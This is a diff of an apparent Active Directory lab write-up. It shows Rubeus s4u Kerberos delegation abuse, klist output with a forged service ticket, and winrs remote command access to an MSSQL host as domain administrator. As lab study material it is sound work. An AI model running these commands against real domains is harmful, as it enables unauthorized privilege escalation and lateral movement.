@@ -155,7 +155,7 @@ C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:appsvc /aes256:b4cb0430da81
 validation of klist:
 
 ```
-C:\Windows\system32>klist
+PS C:\Windows\system32> klist
 
 Current LogonId is 0:0x40d20
 
@@ -165,12 +165,29 @@ Cached Tickets: (1)
         Server: HTTP/us-mssql.us.techcorp.local @ US.TECHCORP.LOCAL
         KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
         Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
-        Start Time: 2/18/2023 16:38:16 (local)
-        End Time:   2/19/2023 2:38:16 (local)
-        Renew Time: 2/25/2023 16:38:16 (local)
+        Start Time: 2/18/2023 16:46:33 (local)
+        End Time:   2/19/2023 2:46:33 (local)
+        Renew Time: 2/25/2023 16:46:33 (local)
         Session Key Type: AES-128-CTS-HMAC-SHA1-96
         Cache Flags: 0
         Kdc Called:
+
+```
+Access such administrator onus-mssql:
+```
+PS C:\Windows\system32> winrs -r:us-mssql.us.techcorp.local cmd.exe
+Microsoft Windows [Version 10.0.17763.3650]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\administrator.US>whoami
+whoami
+us\administrator
+
+C:\Users\administrator.US>hostname
+hostname
+US-MSSQL
+
+C:\Users\administrator.US>
 ```
 
 
